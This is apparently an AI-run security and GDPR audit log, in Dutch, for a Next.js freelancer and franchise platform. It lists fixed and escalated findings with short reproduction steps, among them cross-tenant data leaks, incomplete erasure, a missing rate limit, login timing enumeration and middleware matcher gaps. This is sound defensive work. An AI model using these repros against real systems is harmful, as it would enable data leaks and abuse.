facturen-urgentie-helper is pure sortering (geen export/injectie). Stack-CVE-check: Next.js **15.5.19** ≥
15.5.18 → volledig gepatcht tegen de mei-2026-release (13 CVE's incl. CVE-2026-23870 RSC-DoS). `npm audit
--omit=dev` = **0 kwetsbaarheden** (prod); de 2 dev-only-adviezen (esbuild-Windows-dev-server, js-yaml-DoS)
raken de productiebundel niet.

**Eén nieuwe MIDDEL/HOOG-AVG-erasure-gat gevonden én gefixt (rood→groen); één LAAG defense-in-depth-gat
gefixt; één art.17-deelstuk + twee LAAG-observaties geparkeerd.** Alle drie de oppervlakken bevestigd
schoon (geen KRITIEK/HOOG-authz-gat): de mutatieketen auth→rol→ownership/tenant→Zod→actie→audit is uniform
toegepast, tenant-isolatie via `tenantScopeWhere`/`ownsViaTenant`/`assertSameTenant` met server-herleide
`tenantId`, geen mass-assignment op `tenantId`/`role`, uploads via MIME-allowlist + magic-byte-sniff +
random-key + traversal-guard + SSE, SSRF met harde host-allowlists (Geoapify query-only, web-push-endpoint-
allowlist), wachtwoord-reset met gehashte single-use-token + trusted-origin + rate-limit, CSV via de centrale
formule-injectie-guard (CWE-1236), geen open redirect (geen enkele consumer van client-`callbackUrl`).

### OPGELOST in deze ronde

- **[MIDDEL–HOOG→OPGELOST · AVG art. 17 recht op verwijdering]** `anonymizeUser`
  (`src/app/(protected)/admin/gebruikers/actions.ts`) miste `Performance` volledig: `Performance.description`
  (niet-nullable werkomschrijving die de ZZP'er zélf typt bij het indienen van uren/mijlpalen — kan
  opdrachtgever/locatie/persoonsdetails bevatten) en `milestoneTitle` overleefden de anonimisering verbatim.
  De `Collaboration` wordt niet verwijderd (factuur-/fiscale historie), dus de `onDelete:Cascade` op
  `Performance` vuurt niet — precies zoals bij `Application`/`AvailabilityWindow`/`ShiftHandoff`/
  `WorkExperience`, die wél expliciet worden geredact. Dit was een oversight, geen bewuste retentiekeuze.
  **Gefixt:** `prisma.performance.updateMany({ where: { collaboration: { freelancer: { userId } } }, data: {
description: "[Verwijderd op verzoek van de gebruiker]", milestoneTitle: null } })` in de anonimiserings-
  transactie. Test: `anonymize-erasure.test.ts` (+1 case pint where-scope + redactie van beide velden;
  rood→groen — zonder de updateMany is `find("performance.updateMany")` undefined). **Repro (was):**
  anonimiseer een ZZP'er met ≥1 `Performance` → `description`/`milestoneTitle` lazen onveranderd.
- **[LAAG→OPGELOST · OWASP A01 defense-in-depth]** `src/components/admin/gebruikersbeheer/bemiddelaars-panel.tsx`
  (server-component) laadt álle tenants + de naam/e-mail van elke bemiddelaar (cross-tenant PII) zónder eigen
  server-side rolcheck; het leunde volledig op de ADMIN-gate van zijn enige aanroeper (`/admin/franchises` +
  middleware). Vandaag veilig (één correct-gegate call-site), maar bij hergebruik elders zou de check stil
  wegvallen — afwijkend van het patroon dat elke andere admin-loader/-actie in deze codebase zichzelf gate.
  **Gefixt:** `await requireRole("ADMIN")` bovenaan het paneel, vóór elke query. Test:
  `bemiddelaars-panel.test.ts` (nieuw; rood→groen: mockt `requireRole` als throw en assert dat het paneel
  weigert én dat `tenant.findMany` niet draaide vóór de poort).

### Geparkeerd / geëscaleerd naar de mens (deze ronde)

- **[HOOG (art.9-adjacent) / geëscaleerd — `Performance.rejectionReason` overleeft `anonymizeUser`]** Zelfde
  transactie als hierboven. `Performance.rejectionReason` (`prisma/schema.prisma:867`) is **door de
  OPDRACHTGEVER geschreven vrije tekst óver** de ZZP'er (verplichte reden bij het afkeuren van uren) en kan
  een gezondheids-/incapaciteitsreden bevatten (art. 9). Net als het al-geparkeerde `NoShowReport.reason` is
  dit derde-partij-tekst met een mogelijke bewaargrond bij een facturatie-/urengeschil (art. 17(3)(e)
  rechtsvordering) — een échte retentie-vs-vergetelheid-afweging die per MENSENWERK §5 bij de FG/mens hoort,
  niet bij een agent. De zelf-geschreven velden (`description`/`milestoneTitle`) zijn wél unilateraal gefixt
  (geen retentiegrond). **Repro:** anonimiseer een ZZP'er met een afgekeurde `Performance` → `rejectionReason`
  leest onveranderd. **Geschonden:** AVG art. 17 (+ art. 9 bij gezondheidsreden). **Aanbevolen (voor de mens):**
  óf `rejectionReason` op anonimisering redacten (spiegelt de zusters), óf een expliciete `Performance`-/
  `NoShowReport`-retentieregel + art.9-vlag in `processing-register.ts` vastleggen.
- **[LAAG · CWE-208 timing-side-channel op login-enumeratie]** `src/lib/authorize-credentials.ts` short-circuit
  vóór `bcrypt.compare` wanneer de gebruiker niet bestaat → een niet-bestaand account logt meetbaar sneller in
  dan een fout wachtwoord op een bestaand account. Lage praktische severity: rate-limiting + uniforme foutmelding
  staan al. **Aanbevolen:** altijd een dummy-`bcrypt.compare` tegen een constante hash draaien als er geen user is.
- **[LAAG · scale, geen security-bug] `getRosterCandidatesForDienst`** (`src/lib/franchise/dienst-voordracht.ts`)
  laadt alle tenant-freelancers via `findMany({ where: { tenantId } })` zonder `take`-cap (anders dan zusters
  met een `// unbounded-allow:`-motivatie). Geen lek — puur een schaalnotitie voor zeer grote tenants.

## Ronde 2026-07-13 (2e — basis: `main` @ 1fb87d5)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken: (1) object-/functie-niveau-autorisatie over **álle 38** `src/app/api/**/route.ts`-handlers
(IDOR/SSRF/rate-limit/error-leak/traversal/webhook-cron-auth); (2) cross-tenant/franchise-isolatie over
`src/app/(protected)/franchise/**` + `admin/franchises/**` + `src/lib/tenancy.ts` + `src/lib/franchise/**`
(IDOR/mass-assignment/status-transitie); (3) AVG-betrokkenenrechten (`lib/compliance/*`, `anonymizeUser`-
erasure-volledigheid, PII-in-logs, dataminimalisatie op de nieuwe dashboard-loaders, k-anonimiteit, export/
retentie). Kader: OWASP Top 10 (A01/A03/A05/A07/A09/A10) + ASVS + AVG art. 5/9/15/17/30/32. De verse delta
sinds de vorige ronde (#745–#751: betaal-webhook→overgangsmap, preflight-CLI, geldpuls/nog-te-factureren-
loaders, opdracht-kwaliteitsmeter, +10 ontwerpconcepten) apart nagelopen — schoon: de nieuwe data-loaders
(`data/vat-deadline.ts`, `data/unbilled-invoices.ts`) zijn owner-gescoopt, selecteren alleen bedragen/data
(geen cross-party-PII); de preflight-CLI toont nooit sleutelwaarden (werkt op booleans/modi). Stack-CVE-check:
Next.js **15.5.19** ≥ 15.5.18 → gepatcht tegen de mei-2026-release incl. de CSP-nonce-XSS (dit platform
gebruikt nonces); `npm audit --omit=dev` = **0 kwetsbaarheden**.

**Twee LAAG-bevindingen volledig gefixt (rood→groen); één HOOG/art.9 geëscaleerd naar de mens (juridische
keuze).** Alle drie de grote oppervlakken bevestigd schoon (geen KRITIEK): de mutatieketen auth→rol→
ownership/tenant→Zod→actie→audit is uniform toegepast (incl. audit van gewéigerde document-/dossier-toegang
voor IDOR-detectie), tenant-isolatie via `assertSameTenant`/`ownsViaTenant`/`tenantScopeWhere`, geen
mass-assignment op `tenantId`/`role`/`status`, storage met traversal-guard + magic-byte-sniff + SSE, push-SSRF
met harde host-allowlist, wachtwoord-reset met gehashte single-use-token + trusted-origin-URL + rate-limit,
`anonymizeUser` wist docs/credentials + redact 20+ vrije-tekstvelden incl. 4 dispuutreden-kopieën.

### OPGELOST in deze ronde

- **[LAAG→OPGELOST · AVG art. 5(1)(f) integriteit/vertrouwelijkheid · defense-in-depth PII-in-logs]**
  `src/lib/observability/logger.ts` maskeerde alleen het `fields`-object, niet de `message`-string zelf:
  een toekomstige call-site die een e-mailadres in de tekst interpoleert (`Reset mislukt voor ${email}`)
  zou de PII buiten de redactie om lekken. Bovendien ving de sleutel-redactie geen naam-/adres-sleutels
  (`{ name: user.name }`, `{ naam }`, `{ adres }`) en geen telefoonnummer-sleutels — alleen secret-achtige
  substrings + het e-mail-waardepatroon. **Gefixt:** (a) `message` gaat nu óók door `maskEmails()`; (b) een
  exacte-match-set (`name/naam/voornaam/achternaam/adres/…`) redact naam-/adres-sleutels **zonder** debug-
  sleutels als `filename`/`username`/`hostname` te raken (substring zou dat wél doen); (c) `phone`/`telefoon`
  als substring toegevoegd. E-mail blijft bewust waarde-gemaskeerd (domein leesbaar voor debugging), niet
  volledig geredacteerd. Geen live-lek gevonden bij de bestaande call-sites (allemaal error-namen/niet-PII);
  dit is structurele hardening. Tests: `logger.test.ts` (+3 cases: naam-exact vs filename/username/hostname,
  voor-/achternaam/adres/contactName, telefoon-substring, en e-mail-in-message-masking). PR #<zie hieronder>.
- **[LAAG→OPGELOST · AVG art. 30 register-volledigheid]** `src/lib/compliance/processing-register.ts` miste
  een verwerkingsactiviteit voor `TaxFilingRequest` (IB/BTW-aangifte via een gemachtigd belastingkantoor met
  DigiD/eHerkenning-machtiging, `partnerName`, `aanslagCents`, granulaire toestemmingsmomenten). Data zat wél
  correct in de eigen-data-export en werd correct buiten `anonymizeUser` gehouden (fiscale grond), maar de
  verwerking stond niet in het register. **Gefixt:** 16e `ProcessingActivity` `belastingaangifte-gemachtigde`
  (grondslag TOESTEMMING, ontvangers = gemachtigde-verwerker + Belastingdienst via Digipoort/SBR, bewaartermijn
  7 jaar art. 52 AWR). Test: `processing-register.test.ts` (+1 case pint key/grondslag/bewaartermijn/ontvangers).

### Geparkeerd / geëscaleerd naar de mens (deze ronde)

- **[HOOG (art.9) / geëscaleerd — `NoShowReport.reason` overleeft `anonymizeUser`]** `src/app/(protected)/
admin/gebruikers/actions.ts` (de `anonymizeUser`-transactie, regel 174–363; bevat géén `noShowReport`-
  bewerking). `NoShowReport.reason` (`prisma/schema.prisma:772`) is **door een derde partij geschreven vrije
  tekst óver** de geanonimiseerde ZZP'er en kan een gezondheidsreden bevatten ("ziek gemeld…", art. 9). Na
  anonimisering blijft die tekst verbatim staan, gekoppeld aan de (geanonimiseerde) `FreelancerProfile.id` —
  een admin kan de betrokkene er permanent uit herleiden. De notificatie-kópie van diezelfde reden wórdt al
  geredacteerd (regel 191–204, NO_SHOW_REPORTED expliciet genoemd); de bron-rij niet. **Repro:** anonimiseer
  een freelancer met een `NoShowReport` tegen zich → `reason` leest onveranderd. **Geschonden:** AVG art. 17
  (+ art. 9 bij gezondheidsreden). **Waarom niet unilateraal gefixt:** de code kiest hier bewust voor behoud
  (comment regel 209–210: mogelijke bewaargrond bij een arbeidsgeschil) — dit is een échte retentie-vs-
  vergetelheid-afweging met bijzondere-categorie-data en hoort per MENSENWERK §5 bij de FG/mens, niet bij een
  agent. **Aanbevolen (voor de mens):** óf `NoShowReport.reason` op anonimisering redacten (rij behouden,
  vrije tekst neutraliseren — spiegelt `ShiftHandoff.decisionNote`/`Application.note`), óf een expliciete
  `NoShowReport`-retentieregel + art.9-vlag in `processing-register.ts` vastleggen zodat de uitzondering
  gedocumenteerd is i.p.v. impliciet.
- **[LAAG · logger-message-redactie is e-mail-only, geen naam-detectie in de message-tékst]** Na de fix gaat
  `message` door `maskEmails()`, maar een losse naam/BSN-vormige string ín de message wordt niet gedetecteerd
  (kan niet betrouwbaar via regex). Blijft best-practice om PII in `fields` te zetten, niet in de message.

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken: (1) object-/functie-niveau-autorisatie over **álle** `src/app/api/**/route.ts`-handlers +
`(protected)/**/actions.ts`-server-actions (excl. franchise) — IDOR/ontbrekende authz/mass-assignment/
status-transitie-bypass; (2) cross-tenant/franchise-isolatie over `franchise/**` + `src/lib/franchise/**` +
`src/lib/tenancy.ts` én de nieuwe cross-party-PII-paden (`/kandidaten`, `/kandidaten/vergelijk`,
`candidate-*`); (3) injectie (SQLi/XSS/CSV-formule) + SSRF + secrets/logging + upload-veiligheid + CSP/
headers + AVG-betrokkenenrechten (`lib/compliance/*`, anonymisering/export/retentie). Kader: OWASP Top 10
(A01/A03/A05/A07/A09/A10) + ASVS + AVG art. 5/15/17/30/32. Verse delta sinds vorige ronde
(#739–#744: document-download-rate-limit, storage-zelftest, kandidaat-vergelijker-signalen, reistijd-chip,
+10 ontwerpconcepten) apart nagelopen. `npm audit --omit=dev` = **0 kwetsbaarheden**; typecheck/build groen.

**Geen nieuwe security-/privacy-gaten gevonden (geen KRITIEK/HOOG/MIDDEL).** Alle drie de oppervlakken
bevestigd schoon: elke mutatie draagt de keten auth→rol→ownership/tenant→Zod→actie→audit; de kandidaat-
vergelijker is dubbel eigenaar-gescoopt (`company: { userId: actor.id }` op de opdracht + de gebatchte
reputatie-/historie-/beschikbaarheidsqueries), reputatie sluit `PENDING_REVEAL` uit, reistijd is een grove
stad-tot-stad-schatting (geen exact woonadres); geen raw-SQL-injectie (alleen statische `SELECT 1`-pings),
CSV-exports via de centrale formule-injectie-guard (CWE-1236), SSRF afgeschermd (vaste hosts, user-tekst
alleen als query-param), logger redacteert PII/secrets, uploads via MIME-allowlist + magic-byte-sniff +
random storage-key + traversal-guard, `anonymizeUser` wist docs/credentials + redact audit-metadata-PII.

### OPGELOST in deze ronde

- **[LAAG→OPGELOST · defense-in-depth · CLAUDE.md architectuurregel 3 (statusovergangen via expliciete map) —
  de betaal-webhook was de énige `Subscription.status`-schrijver die de map omzeilde]** `src/app/api/billing/
webhook/route.ts` zette de abonnementsstatus met losse inline `!==`/`===`-checks (`paid` → ACTIVE,
  `failed` → PAST_DUE), terwijl de zustertaken (`past-due-task.ts`, `subscription-expiry-task.ts`) hun
  overgang defensief tegen `SUBSCRIPTION_TRANSITIONS` toetsen. De uitgevoerde overgangen zijn met de
  huidige map allemaal geldig (dus geen exploit vandaag), maar het pad was niet gebonden aan de bron van
  waarheid: zou de map ooit worden aangescherpt (bv. `CANCELLED → ACTIVE` verwijderd zodat een **herspeelde/
  late `paid`-webhook een geannuleerd abonnement niet stilzwijgend heractiveert**), dan bleef de webhook zijn
  eigen logica volgen. **Gefixt:** nieuwe, geëxporteerde `canSubscriptionTransition(from, to)` die
  fail-closed tegen `SUBSCRIPTION_TRANSITIONS` toetst (onbekende bronstatus → geen enkele overgang); beide
  update-takken zijn er nu mee bewaakt. Behoud van gedrag onder de huidige map, maar voortaan gebonden aan
  regel 3. Tests: `src/app/api/billing/webhook/route.test.ts` (+5 cases: PAST_DUE→ACTIVE bij `paid`, geen
  schrijf bij `failed` op ACTIVE, en directe unit-tests van de fail-closed-invariant incl. onbekende status).

### Geparkeerd (LAAG — observaties, geen blocker)

- **[LAAG · CSP — `script-src` bevat naast nonce + `'strict-dynamic'` óók `'unsafe-inline' https:`]**
  Dit is de standaard CSP3-fallback: moderne browsers negeren `'unsafe-inline'` zodra een nonce aanwezig is,
  en `'strict-dynamic'` staat er. In code gedocumenteerd (`src/lib/csp.ts`). Geen echte verzwakking, maar een
  menselijke sanity-check vóór go-live met echte documenten is verstandig (MENSENWERK §5). **Aanbevolen:**
  bevestig dat er geen legacy-browser-eis meer is en overweeg de `'unsafe-inline'`-fallback te schrappen.
- **[LAAG · AVG art. 5(1)(e) retentie — geen geautomatiseerde purge van gevoelige documenten]** Het
  verwerkingsregister (`lib/compliance/processing-register.ts`) benoemt een bewaartermijn ("niet langer dan
  nodig voor verificatie"), maar er is geen job die verificatiedocumenten automatisch verwijdert zodra ze niet
  meer nodig zijn — verwijdering loopt nu alleen via de handmatige admin-`anonymizeUser`. Consistent met het
  expliciete beleid dat AVG-verwijdering mensenwerk blijft; ter bevestiging aan een mens vóór het volume echte
  VOG/diploma's groeit. **Aanbevolen:** een expiry-/retentie-job (opt-in, human-in-the-loop) zodra het volume dat vraagt.

## Ronde 2026-07-12 (2e — basis: `main` @ 9fbd20a)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-security-subagents op niet-overlappende
oppervlakken: (1) document-/dossier-serving + AVG-betrokkenenrechten + upload-veiligheid; (2) cross-
tenant/franchise-IDOR over álle `franchise/**`-actions + `src/lib/franchise/**`; (3) cron/webhook/push/
routing-SSRF + client-error/csp-report + auth-rate-limiting. Kader: OWASP Top 10 (A01/A03/A04/A05/A07) +
ASVS + AVG art. 5/15/17/32. De verse delta sinds #730 (#731–#738) is apart nagelopen (request-id-
sanitisatie, middleware, de nieuwe pure kans-/beschikbaarheidssignalen, de opdrachten-lijst-query) —
schoon: aggregaat-only tellingen, eigenaar-scoped queries, CR/LF-weerbare header-sanitisatie.

**Eén MIDDEL volledig gefixt (rood→groen).** Overige oppervlakken bevestigd schoon (geen KRITIEK/HOOG):
tenant-isolatie uniform via `assertSameTenant`/`ownsViaTenant`/`tenantScopeWhere`; cron via Bearer +
`timingSafeEqual` + 503-inert; Stripe-webhook HMAC + 300s replay-window (Mollie: server-side re-fetch);
push-/routing-SSRF met harde host-allowlist; AVG-anonimisering wist docs/credentials + redact audit-
metadata-PII (`scrubAuditMetadataPii`); AVG-export eigen-data-only + audited; CSV-exports met formule-
injectie-guard (CWE-1236); document-IDOR-keten (`canAccessDocument`) audit-both-paden; upload via
MIME-allowlist + magic-byte-sniff + random storage-key; `npm audit` prod = **0 kwetsbaarheden**.

### OPGELOST in deze ronde

- **[MIDDEL→OPGELOST · OWASP A04 (insecure design — unrestricted resource consumption) / API4:2023 ·
  parity met de bestaande `documentPdfRateLimiter`-rem — `/api/documents/[id]` had géén rate-limit]**
  De privé document-download is de énige route die de rauwe bytes van de gevoeligste bestanden
  (VOG/diploma/ID/verzekering) serveert, maar was — anders dan álle zuster-routes (dossier, DBA-dossier,
  modelovereenkomst, factuur-/prestatie-PDF, die de `documentPdfRateLimiter` al hadden) — niet geremd.
  **Repro:** een geauthenticeerde FREELANCER/CLIENT hamert `GET /api/documents/<gegokte-cuid>` in een
  ongeremde loop → per request een DB-lookup + `storage.exists`/`storage.get` (S3-read in prod) + een
  `DOCUMENT_ACCESS_DENIED`/`DOCUMENT_ACCESSED`-auditregel, tegen nul kosten voor de aanvaller. `Document.id`
  is een `cuid()` (niet volledig willekeurig), dus enumeratie is niet hypothetisch; de data zelf bleef
  afgeschermd door `canAccessDocument`, maar de storage-kosten/auditgroei/DB-belasting niet. **Gefixt:**
  nieuwe `documentDownloadRateLimiter` (default **240/uur/gebruiker**, env `DOCUMENT_DOWNLOAD_RATE_LIMIT`,
  window 1u, prefix `docdl:` — ruimer dan de PDF-rem vanwege de legitiem frequentere inline-preview in de
  verificatiequeue), aangeroepen via `enforceRateLimit` **direct na `requireActor()`**, dus vóór de
  DB-lookup — de loop wordt geremd voordat hij iets kost. Tests: `src/app/api/documents/[id]/route.test.ts`
  (nieuw, 3 cases rood→groen: rem aangeroepen met de juiste limiter+actor-key; 200 binnen de limiet met
  bytes geserveerd; 429 kort-sluit vóór de DB-lookup — geen `storage.get`, geen `DOCUMENT_ACCESSED`-audit).

### Geparkeerd

- **[LAAG · dev-only dependency-DoS · js-yaml GHSA-h67p-54hq-rp68 (quadratische complexiteit bij merge-
  keys)]** Transitieve **dev**-afhankelijkheid via `eslint → @eslint/eslintrc → js-yaml@4.1.1`; zit niet in
  de productie-bundle en verwerkt geen gebruiker-invoer at runtime (alleen eslint-config). `npm audit`
  (incl. dev) = 1 low + 1 moderate, beide via deze keten. **Aanbevolen fix:** `npm audit fix` of een
  `overrides`-pin op een gepatchte js-yaml zodra eslint de transitieve dep bumpt — niet forceren zolang
  het eslint kan breken; geen productie-impact. `npm audit --omit=dev` = 0.

## Ronde 2026-07-12 (basis: `main` @ b5c8b66)

Audit: orchestrator (Opus 4.8) op de vérse delta sinds de vorige ronde (`af5212e..b5c8b66`, #725–#730 —
onderhouds-login-DB-schrijf-fix #725, DB-connection-pool-seam #726, effectief uurtarief na reistijd #727,
+10 ontwerpconcepten #728, ontvangen uitnodigingen op /opdrachten #729, dubbele-boeking-signaal bij het
voordragen #730). Niet-overlappende oppervlakken: (1) tenant-isolatie/IDOR op de nieuwe roster-voordracht-
data (`dienst-voordracht.ts` + `roster-double-booking.ts`); (2) IDOR/PII op de nieuwe ontvangen-uitnodigingen
(`data/received-invitations.ts` + `received-invitations.ts`); (3) secret-lek/config op de #726-delta
(`system-status.ts`, `db-connection.ts`, `env.ts`, `db.ts`) + de pure `effective-rate.ts`. Kader: OWASP
Top 10 (A01/A03/A05) + ASVS + AVG art. 5/32.

**Eén HOOG volledig gefixt (rood→groen).** De rest bevestigd schoon: de ontvangen-uitnodigingen leiden de
lijst af uit de eigen `JOB_INVITED`-auditrecords, gescopet op het uit de sessie afgeleide `freelancerProfileId`
(geen client-input, exacte id-parse tegen substring-vals-positieven, drie begrensde eigenaar-queries, exposeert
alleen opdracht-titel + opdrachtgever-naam van nog-`PUBLISHED` opdrachten); `getRosterCandidatesForDienst`
her-asserteert de tenant bij de read (`job.tenantId !== tenantId → null`) en scoopt de roster-query op
`tenantId`; `system-status` is ADMIN-only en leest uitsluitend driver-MODI/booleans (nooit een sleutelwaarde,
de rauwe `Env` passeert de client-grens niet); `effective-rate.ts` is puur/deterministisch zonder I/O.

### OPGELOST in deze ronde

- **[HOOG→OPGELOST · OWASP A01 (broken access control) · CLAUDE.md regel 2 / Veiligheidsregels (tenant-
  isolatie) — het dubbele-boeking-signaal (#730) lekte de dienst-TITEL van een andere tenant aan de
  bemiddelaar]** Het nieuwe dubbele-boeking-signaal op `/franchise/diensten/[id]/voordragen`
  (`getRosterCandidatesForDienst` → `detectDoubleBooking`) haalde **alle** ACTIEVE samenwerkingen van een
  roster-ZZP'er op — met `job: { select: { title: true } }` zónder tenant-filter — en toonde de franchiser
  `Al ingezet — overlap met "<titel>"`. Een roster-ZZP'er van tenant A kan echter óók op een **opengestelde
  (overflow) dienst van een ándere franchise** (tenant B) of een **platform-opdracht** (`Job.tenantId = null`)
  staan — `visibleJobsWhereForTenant` stelt tenant-ZZP'ers expliciet in staat op overflow-diensten van andere
  franchises te werken. Gevolg: franchise A las de vertrouwelijke dienst-titel van franchise B (of een platform-
  opdracht) uit het waarschuwingslabel — een cross-tenant-datalek. **Repro:** een roster-ZZP'er van tenant A
  heeft een ACTIEVE samenwerking op een overflow-dienst "Geheime dienst van franchise B" (tenant B) die de
  startdatum van de te bemensen dienst overlapt → franchiser A opent `/franchise/diensten/<id>/voordragen` →
  ziet `Al ingezet — overlap met "Geheime dienst van franchise B"`. **Gefixt:** `ActivePlacement` draagt nu
  `tenantId` (uit `Job.tenantId`) en `DoubleBookingInput` een `viewerTenantId` (= `actor.tenantId`);
  `detectDoubleBooking` telt élke overlap mee (de ZZP'er is die dag hoe dan ook bezet — planwaarde behouden)
  maar geeft `firstTitle` **alleen** prijs voor de vroegst-startende overlap **binnen de eigen tenant**; een
  overlap op een andere tenant of platform-opdracht valt terug op het generieke, titelloze label
  ("Al ingezet op een overlappende dienst", dat de UI al ondersteunt). De data-laag selecteert nu
  `job.tenantId` mee en geeft `viewerTenantId: tenantId` door. Tests: `roster-double-booking.test.ts` (3 nieuwe
  cases, rood→groen: cross-tenant/platform-titel verborgen, telling behouden, eigen-tenant-titel gekozen boven
  een vroegere cross-tenant-overlap) + `dienst-voordracht.test.ts` bijgewerkt met tenant-velden.

## Ronde 2026-07-11 (2e — basis: `main` @ af5212e)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-subagents op de vérse delta sinds
de vorige ronde (`350aa49..af5212e`, #718–#724 — onderhoudsmodus #719, opdrachtgever-reputatie voor
de ZZP'er #720, staat-van-dienst op het vertrouwensdossier #723, uitnodiging-opvolging #722,
persona-sweeps). Niet-overlappende oppervlakken: (1) de nieuwe onderhoudsmodus + `middleware.ts` +
`system-status`/`env`-delta (maintenance-bypass, header/HTML-injectie, auth-verzwakking, secret-lek);
(2) uitnodiging-opvolging + opdrachtgever-reputatie + `signals`/`stage`/`pending-tasks`-delta
(IDOR/authz/cross-party-PII/XSS); (3) AVG-volledigheid — schema-delta model-voor-model tegen
`anonymizeUser`/`account-export`, de nieuwe publieke aggregaties (`company-reputation`,
`freelancer-track-record`) op k-anonimiteit/PII, PII-in-logs. Kader: OWASP Top 10 (A01/A03/A05/A07/A09)

- ASVS + AVG art. 5/15/17/30/32. `npm audit --production`: **0 kwetsbaarheden**.

**Eén HOOG + één LAAG volledig gefixt (rood→groen); één MIDDEL geparkeerd.** De rest bevestigd schoon:
de schema-delta is leeg (geen nieuw PII-veld), de nieuwe aggregaties lekken uitsluitend geaggregeerde
statistiek (geen review-auteur/rating, geen collaboratie-/klant-identiteit; `PENDING_REVEAL`-reviews
uitgesloten), de uitnodiging-opvolging is dubbel owner-gescopet (data-fetch + render) en exposeert
alleen tellingen, `MAINTENANCE_MESSAGE` is HTML-escaped + control-char-gestript + lengte-gecapt,
`Retry-After` is `parseInt`+geklemd, `system-status` lekt alleen driver-modi/booleans (nooit een
secret-waarde), de env-delta is niet-fataal (CLAUDE.md regel 8), en de onderhoudspoort verzwakt geen
enkele auth/rol/ownership-check (voegt enkel een blokkade toe).

### OPGELOST in deze ronde

- **[HOOG→OPGELOST · OWASP A05 (security misconfiguration) · CLAUDE.md AUTO-MODE §2 (DB-integriteit)
  / RUNBOOK §9 — volledige onderhouds-afsluiting (`MAINTENANCE_ALLOW_ADMIN=false`) stopte de
  login-DB-schrijfacties niet]** De onderhoudsmodus (#719) draait in de `middleware`, maar de
  middleware-`matcher` sluit `/api/auth/**` expliciet uit — daar draait de middleware dus nooit.
  Gevolg: met `MAINTENANCE_MODE=true` + `MAINTENANCE_ALLOW_ADMIN=false` (de "volledige afsluiting",
  bewust bedoeld voor een database-herstel/migratie waarbij élk verkeer schade kan doen) voerde een
  `POST /api/auth/callback/credentials` nog stééds `user.findUnique`, rate-limiter-lees/schrijf,
  `user.update({ lastLoginAt })` en `audit()`-inserts uit tegen de live database — precies wat de
  beheerder verwacht dat stilligt. Alleen de vervolg-paginanavigatie kreeg de 503. Repro: zet de
  volledige afsluiting aan tijdens een herstel → login schrijft toch naar de DB. Gefixt: nieuwe pure
  poort `loginBlockedByMaintenance(mode, allowAdmin)` (`src/lib/maintenance.ts`) + `authorizeCredentials`
  losgetrokken uit `src/auth.ts` naar `src/lib/authorize-credentials.ts` (NextAuth-vrij, direct
  testbaar); de poort staat als eerste statement, vóór élke Prisma-call, en weigert stil (bewust géén
  audit — dat zou zelf een DB-schrijf zijn). In de standaardmodus (admin-bypass AAN) blijft login
  werken (beheerder moet de deploy kunnen verifiëren). Tests: `src/lib/authorize-credentials.test.ts`
  (rood→groen: bij volledige afsluiting wordt `findUnique`/rate-limiter/`audit` niet aangeroepen; in de
  standaardmodus + onderhoud-uit wél) + pure cases in `maintenance.test.ts`.
- **[LAAG→OPGELOST · beschikbaarheid/robuustheid — `isMaintenanceExemptPath` was exact-match, geen
  trailing-slash-normalisatie]** `/api/health/` (trailing slash) telde niet als vrijgestelde
  gezondheids-probe en zou tijdens onderhoud de 503-pagina krijgen i.p.v. de healthcheck-respons — een
  host-healthcheck met slash kon de container zo laten flapperen (faalt gesloten, dus geen bypass).
  Gefixt: trailing slash genormaliseerd vóór de vergelijking. Test: nieuwe case in `maintenance.test.ts`.

### Geparkeerd in deze ronde

- **[MIDDEL · OWASP A05 — de middleware-`matcher` sluit élk pad met een punt uit → onderhoudsmodus
  én CSP-header worden overgeslagen voor zulke requests]** De `matcher`-regex
  (`/((?!api/auth|_next/static|_next/image|favicon.ico|.*\.).*)`) sluit ieder pad met een punt
  ergens in de path uit, niet alleen bekende statische extensies. Een request als
  `GET /opdrachten/x.y` bereikt de middleware dus nooit → geen onderhouds-503 én geen CSP-header op
  die respons. **Geen authz-/document-lek** (geverifieerd: de pagina's dwingen zelf `requireActor`/
  `requireRole` af met een verse DB-lookup, dus geen auth-bypass); het is een beschikbaarheids-/
  DB-isolatie-gat in de noodrem-garantie + een CSP-dekkingsgat op dotted dynamische routes.
  Aanbevolen fix: versmal de punt-uitsluiting tot echte statische extensies
  (`\.(?:ico|png|jpg|jpeg|gif|svg|css|js|map|txt|xml|json|woff2?)$`) i.p.v. "bevat ergens een punt".
  Bewust geparkeerd: het raakt de globale routing-matcher (brede blast-radius, verdient een eigen PR
  met e2e-verificatie), niet samen te voegen met de auth-poort-fix hierboven.

## Ronde 2026-07-11 (basis: `main` @ 350aa49)

Audit: orchestrator (Opus 4.8) + 4 parallelle adversariële Opus-subagents op niet-overlappende
oppervlakken: (1) franchise/tenant-isolatie & IDOR (incl. de nieuwe compliance-strip #716,
roster-capaciteit #707, klant-relatiegezondheid #709, shift-overname-governance, `tenancy.ts`);
(2) alle `/api/**`-routes + document-/media-/PDF-/dossier-/ICS-serving, cron-auth, webhook, SSRF,
upload; (3) privacy/AVG — volledigheid van `anonymizeUser`/`account-export`, model-voor-model-walk
van `schema.prisma` tegen de erasure-transactie, dataminimalisatie, k-anonimiteit, PII-in-logs;
(4) injectie (SQL/XSS/CSV/ICS/template), mass-assignment/Zod, secrets, auth/sessie, CSP,
`npm audit`. Kader: OWASP Top 10 (A01/A03/A07/A09) + ASVS + AVG art. 5/15/17/20/30/32. Toegepast
op de nieuwste features sinds de vorige basis (`8d0a3dd`): bulk-uitnodiging (#715, `job-invite.ts` +
`inviteSuggestedFreelancersToJob`), cashflow-prognose (#713), db-backup-ops (#712).

**Drie bevindingen volledig gefixt (rood→groen): twee HOOG (AVG art. 17) + één MIDDEL
(cross-tenant PII, defense-in-depth).** Injectie/secrets/auth/CSP/`npm audit --production` (0 vulns)
bevestigd schoon; alle document/PDF/dossier-serving met owner/tenant-check + audit vóór bytes;
franchise-queries `tenantScopeWhere`-gescopet zonder client-`tenantId`; de nieuwe bulk-invite volgt
de volledige mutatieketen (auth→rol CLIENT→ownership→server-side eligibility→rate-limit→audit);
db-backup geeft de connectie-URL als argv-arg door (geen shell-injectie) en redigeert wachtwoorden.

### OPGELOST in deze ronde

- **[HOOG→OPGELOST · OWASP A01/A09 · AVG art. 17 — `FreelancerProfile.defaultMotivation` overleefde
